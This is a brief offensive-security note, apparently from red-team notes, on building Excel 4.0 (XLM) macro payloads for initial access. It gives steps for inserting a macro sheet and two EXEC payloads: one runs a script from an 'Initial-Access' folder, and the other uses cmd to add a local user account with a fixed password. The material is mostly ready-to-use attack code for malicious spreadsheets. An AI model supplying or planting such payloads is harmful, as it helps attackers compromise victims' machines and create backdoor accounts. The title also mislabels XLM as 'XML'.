# XML Macro

***

Microsoft Excel still supports Excel 4.0 (XLM) macros, we encourage you to migrate them to the latest version of Microsoft Visual Basic for Applications (VBA). Migrating your macros lets you take advantage of the improvements to the VBA programming object model

### Create Payload

Right click on sheet --> insert --> MS Excel 4.0 Macro

```excel
=EXEC("E:\Initial-Access\Macro\screen.cmd")
=HALT()
```

```excel
=EXEC("cmd /c net user /add nooranet Aa123456")
=HALT()
```
